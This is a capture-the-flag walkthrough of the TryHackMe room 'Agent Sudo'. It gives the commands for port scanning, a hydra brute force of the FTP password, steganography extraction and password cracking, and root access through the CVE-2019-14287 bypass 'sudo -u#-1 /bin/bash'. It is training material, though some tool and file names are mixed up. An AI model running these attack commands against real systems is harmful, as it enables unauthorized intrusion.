---
layout: single
title: Agent Sudo (TryHackMe) - WriteUp (by blu3ming)
excerpt: "Writeup de la máquina Agent Sudo de la plataforma TryHackMe. Nota: Puede incluir fallos y rabbit holes, los cuales se especifican, con el objetivo de que el lector no cometa los mismos errores que yo en un futuro. Se recomienda leer el artículo completo antes de seguirlo al pie de la letra."
date: 2021-05-30
classes: wide
header:
  teaser: /assets/images/agent-sudo-writeup/logo.png
  teaser_home_page: true
categories:
  - Writeup
tags:
  - TryHackMe
  - Writeup
  - Guia
---

[https://tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/agentsudoctf)

+ We start with a nmap scan (TCP-SYN) for open ports (no host discovery or dns resolution).
  
    ``nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.33.214 -oG allPorts``

+ We see that FTP, SSH and HTTP are open.

    ![1]
    
+ With the help of whatweb, we try to enumerate for any CMS or software the web server is running.

    Nothing relevant appears.

    ![2]
    
+ We enumerate in nmap (with basic enum scripts) for versions in the services.

    ``nmap -sC -sV -p21,22,80 10.10.33.214 -oN targeted``

    ![3]
    
    We see that the FTP software, vsftpd, is running version 3.0.3.
    
+ We try to look for an exploit in exploitdb.
    
    Nothing appears, so it´s not a vulnerable version.
    
    ![4]
    
+ We try to login with anonymous user in the FTP service, but it didn't work.

    ![5]
    
+ Let's see the webpage. It tells that we must try to access with our codename as User-Agent.

    ![6]
    
    TryHackMe gives us the hint to try the codename "C". To change the User-Agent, we use **curl**.
    
+ Let's see the response of the webserver with curl, and the changed User-Agent.

    We use the flag -L to apply a redirection in the page (for the change in the User-Agent).

    ``curl "http://10.10.33.214" -H "User-Agent: C" -L``
    
    ![7]
    
    From this, we know that the pass for the user **chris** is weak (also that Agent C is chris). Let's crack it.
    
+ Let's use **john** to brute-force the password for the FTP service, with the user chris.

    ``hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.33.214 -t 10 -v``
    
    ![8]
    
    John detects the password, so let's login with the new credentials.
    
+ Login with the FTP credentials and list all the content.
    
    ![9]
    
    We see three files, two images and a txt file. Lest download all of them to our current directory.
    
    ``mget *``
    
+ If we open the txt file, we see the next message.

    ![10]
    
    From this, we know that the images contain hidden data (steganography). Also, we get a new user (J) and the hint to his SSH password.
    
+ Let's use binwalk to see any hidden file in the images.

    ![11]
    
    We see that the image **cutie.png** contains a ZIP file inside. Let's extract it.
    
    ``binwalk -e cutie.png``
    
    ![12]
    
    The extracted **ZIP** has password, so we need to crack it first.
    
+ We are going to use zip2john to get the hash first

    ``zip2john 8702.zip > zip_hash``
    
+ Now, let's use john to brute-force the hash obtained in the previous step

    ``john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash | tee zip_pass``
    
    We transfer the output to a file to save all the results (**tee**).
    
    ![13]
    
    We obtain the ZIP file key.
    
+ If we extract the file (I recommend to use 7z, because unzip doesn't recognize the password to extract), we obtain a new txt file.

    ![14]
    
    We get a new message, which says:
    
    ```
    Agent C,
    
    We need to send the picture to 'XXXX' as soon as possible!
    
    By,
    Agent R
    ```
    
    This "location" is in base64, so we decode it.
    
    ``echo "XXXX" | base64 -d``
    
    ![15]
    
+ We have finished with the png file, so now let's work with the jpg file. Let's see if there's something hidden with steghide

    ``steghide extract -sf cute-alien.png``
    
    It asks us for a password, so we introduce the last word we get (in the previous step, after decode it).
    
    We see that it extracts a hidden message to a txt file, so we open it.
    
    ![16]
    
    It gives us an user (james) and his SSH password.
    
+ We login to SSH with the new credentials.

    ``ssh james@10.10.33.214``

    Now, we have access to the machine.
    
    ![17]
    
    We can see the user flag using ls in the current directory.
    
+ Now, let's do the privesc. We can use LinPeas, uploading the script to the system with scp (because we already know the SSH password)

    ``scp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh james@10.10.33.214:/dev/shm``
    
    ![18]
    
    But let's do some manual enum. First, let's see for sudo permissions:
    
    ``sudo -l``
    
    We get the next permissions:
    
    ```
    User james may run the following commands on agent-sudo:
         (ALL, !root) /bin/bash
    ```
    
    If we google those permissions, we get information about a CVE released in 2019 about a vulnerability on the command sudo. This is the CVE-2019-14287.
    
    ![19]
    
    To bypass the restriction established in the **suddoers** file, we need to execute the next command:
    
    ``sudo -u#-1 /bin/bash``
    
    To learn more about this vulnerability, you can access to this [site](https://www.exploit-db.com/exploits/47502)
    
+ When we execute the command, it asks us for the james password; we introduce it and receive a root bash.

    We can see it in the name of the prompt and with the command whoami.
    
    ![20]
    
    Now, we can go to the root directory, and get the root flag.
    
    ![21]
    
+ BONUS: The machine also request to get the "name of the incident" of the image in the user james directory.

    It's all about an OSINT task. We only need to use the reverse search of Google with the image, and filtrate the results by "Foxnews".
    
[1]:/assets/images/agent-sudo-writeup/1.png
[2]:/assets/images/agent-sudo-writeup/2.png
[3]:/assets/images/agent-sudo-writeup/3.png
[4]:/assets/images/agent-sudo-writeup/4.png
[5]:/assets/images/agent-sudo-writeup/5.png
[6]:/assets/images/agent-sudo-writeup/6.png
[7]:/assets/images/agent-sudo-writeup/7.png
[8]:/assets/images/agent-sudo-writeup/8.png
[9]:/assets/images/agent-sudo-writeup/9.png
[10]:/assets/images/agent-sudo-writeup/10.png
[11]:/assets/images/agent-sudo-writeup/11.png
[12]:/assets/images/agent-sudo-writeup/12.png
[13]:/assets/images/agent-sudo-writeup/13.png
[14]:/assets/images/agent-sudo-writeup/14.png
[15]:/assets/images/agent-sudo-writeup/15-1.png
[16]:/assets/images/agent-sudo-writeup/16.png
[17]:/assets/images/agent-sudo-writeup/17.png
[18]:/assets/images/agent-sudo-writeup/18.png
[19]:/assets/images/agent-sudo-writeup/19.png
[20]:/assets/images/agent-sudo-writeup/20.png
[21]:/assets/images/agent-sudo-writeup/21.png